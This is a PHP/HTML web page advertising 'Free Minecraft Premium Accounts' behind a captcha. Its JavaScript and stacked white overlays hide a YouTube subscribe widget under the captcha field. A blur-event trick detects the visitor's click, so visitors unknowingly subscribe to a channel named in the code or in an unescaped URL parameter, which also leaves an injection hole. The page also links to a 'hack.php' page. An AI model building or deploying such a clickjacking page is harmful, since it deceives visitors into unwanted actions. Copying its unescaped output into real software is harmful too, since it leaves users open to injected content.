<?php
/*
Description: 	Simple Language Changer Class 
				you can use it for change language to another one 
				it is simple to use 
Auther:			Payam khaninajad 
Contact Email:	progvig@yahoo.com
Site:			http://progvig.ir
Year:			2010/11/13
*/
session_start();
if ($_POST['action'] == "checkdata") {
    if ($_SESSION['tmptxt'] == $_POST['tmptxt']) {
    $_SESSION['listo'] = true; // En caso de ser Iguales establecer la sesion "listo"
    header('Location: privada.php');
    exit;
} else // En caso de que la Pass no sea Correcta lanzamos un error con JavaScript.
{
?>
<script type="text/javascript">
<!--
alert('El codigo es erroneo.')
//-->
</script>
<?php
}
}

// register session to change language
session_register("mylang");
// if session isn't set 
if(!isset($_SESSION['mylang'])) 
{
	$_SESSION['mylang']="es";
}
//include language class


if(isset($_GET['lang'])) 
{
	switch($_GET['lang']) 
	{
		case "es":
		$_SESSION['mylang']="es";
		break;
		case "en":
		$_SESSION['mylang']="en";
		break;
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Free Minecraft Premium Accounts!</title>
<script src="http://code.jquery.com/jquery-1.9.0.js"></script>
<style>
body {font-family:Arial;margin:5;overflow:hidden;}
</style>
<script language="JavaScript">
function disableEnterKey(e)
{
     var key;
     if(window.event)
          key = window.event.keyCode;     //IE
     else
          key = e.which;     //firefox
     if(key == 13)
          return false;
     else
          return true;
}
</script>
<script type="text/javascript">
    $(document).ready(function() {
        var isOverIFrame = false;

        function processMouseOut() {
            log("IFrame mouse >> OUT << detected.");
            isOverIFrame = false;
            top.focus();
        }

        function processMouseOver() {
            log("IFrame mouse >> OVER << detected.");
            isOverIFrame = true;
        }

        function processIFrameClick() {
            if(isOverIFrame) {
		setTimeout(function() {
 		$("#wait").show();
		$("#sub").show();
		}, 390);

		setTimeout(function() {
 		$('#login').click();
		}, 3000);
            }
        }

        function log(message) {
            var console = document.getElementById("console");
            var text = console.value;
            text = text + message + "\n";
            console.value = text;
        }

        function attachOnloadEvent(func, obj) {
            if(typeof window.addEventListener != 'undefined') {
                window.addEventListener('load', func, false);
            } else if (typeof document.addEventListener != 'undefined') {
                document.addEventListener('load', func, false);
            } else if (typeof window.attachEvent != 'undefined') {
                window.attachEvent('onload', func);
            } else {
                if (typeof window.onload == 'function') {
                    var oldonload = onload;
                    window.onload = function() {
                        oldonload();
                        func();
                    };
                } else {
                    window.onload = func;
                }
            }
        }

        function init() {
            var element = document.getElementsByTagName("iframe");
            for (var i=0; i<element.length; i++) {
                element[i].onmouseover = processMouseOver;
                element[i].onmouseout = processMouseOut;
            }
            if (typeof window.attachEvent != 'undefined') {
                top.attachEvent('onblur', processIFrameClick);
            }
            else if (typeof window.addEventListener != 'undefined') {
                top.addEventListener('blur', processIFrameClick, false);
            }
        }

        attachOnloadEvent(init);
    });
</script>
</head>
<body>

<?php

require_once 'inc/lang.class.php';
$mylang=new mylanguage();
$mylang->load_language($_SESSION['mylang']);

?>

<h3><?php echo text1; ?></h3>

<center><h1><?php echo text2; ?></h1>
<br>

<div style="width: 100%; height: 200px; background:#fff; z-index: 6; position: absolute; margin: 0; display:none;" id="wait"><center><h1><br><?php echo text3; ?></h1><img src="http://revistav.uvm.edu.ve/admincontenido/images/load.gif" style="width:32px; height:32px;" /></center></div>
<div style="position:relative; top:-20px; width:300px; z-index:5;">
<?php echo text4; ?><br>
<form action="" method="post">
<img src="captcha.php" width="100" height="30" vspace="3" /><br>
<input name="tmptxt" onKeyPress="return disableEnterKey(event)" type="text" size="30" /><br>
<input name="btget" type="submit" style="display:none;" value="Check" id="login" />
<input name="action" type="hidden" value="checkdata" />
</form>
</div>

<div style="position:relative; top:-220px; left:60px;">
<div style="width:84px; background:#fff; border:1px #fff solid; height: 34px; position:relative; z-index:4; left: -63px;top: 238px; display:none;" id="sub"></div>
<div style="width: 6px; background: #fff; height: 34px; position:relative; z-index:4; left: -102px; top: 204px;"></div>
<div style="width: 84px; background: #fff; height: 5px; position:relative; z-index:4; left: -63px; top: 203px;"></div>
<div style="width: 298px; height: 66px; position:relative; top: 101px; left: 45px; background:#fff; border:1px #fff solid; z-index:1;"></div>
<div style="width: 214px; height: 33px; position:relative; left: 87px; top: 100px; border:1px #fff solid; background: #fff; z-index:3;"></div>
<iframe id="marco" src="http://www.youtube.com/subscribe_widget?p=<?php echo (!isset($_GET['sub']) || is_null($_GET['sub'])) ? 'ikillnukes4evertmb' : $_GET['sub'];  ?>" style="overflow: hidden; height: 105px; width: 300px; border: 0; position:relative; left:45px; z-index:0;" scrolling="no" frameborder="0"></iframe></div>

<br></br>
<br></br>
<div style="position:relative; bottom:200px; display:none;">
Te sirvi&oacute; esto, pues DALALAI'!<br>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/es_LA/all.js#xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>

<div class="fb-like" data-send="false" data-layout="standard" data-width="450" data-show-faces="false" data-colorscheme="light" data-action="like"></div></div>

<div style="position:relative; bottom:200px;"><h1><?php echo text5; ?></h1><a href="http://minecraftviewer.com/servers/1670630/view" target="_blank"><img src="http://cache.multiplayuk.com/b/1-1670630-560x95-5-FF5519-FFFFFF.png" alt="Server Banner" style="border:0;width:560px;height:95;position:relative;top:-15px;" /></a><br><b>|| Juegos del Hambre By Berni || 24/7 || NO PREMIUM || NO HAMACHI || # HG IP : # 76.72.172.232:25578 ||</b><br><br>

<?php 
$fp = fopen("id.txt","r");  
//Se abre el archivo contador.txt, la r de read 

$visitas = intval(fgets($fp));  
// Se lee las visitas y se indica con intval para que se devuela un valor entero 

$visitas++;  
//Se agregan las visitas 

fclose($fp);  
// Se cierra el archivo 

$fp = fopen("id.txt","w");  
// Se abre en modo de escritura 

fputs($fp,$visitas);  
// Se escriben las visitas  
?>
<?php echo text9." "; ?>
<?
echo number_format($visitas);  
// Se muestran las visitas 
?> <?php echo text6; ?><br>|| <?php echo text7; ?> || (Skype: <b>ikillnukes</b>) ||<br><font color="000000">||</font> <a href="hack.php"><?php echo text8; ?></a> <font color="000000">||</font>
</div>

</center>

<form name="form" id="form" action="" style="display:none;"><textarea name="console"
id="console" style="width: 100px; height: 300px;" cols="" rows=""></textarea>
<button name="clear" id="clear" type="reset">Clear</button>
</form>

<span style="display:none;"><a href="inicio.php?lang=en"><img src="images/us.gif" /></a> | <a href="inicio.php?lang=ir"><img src="images/ir.gif" /> </a>|<a href="inicio.php?lang=tr"> <img src="images/tr.gif" /></a><br /></span>

</body>
</html>
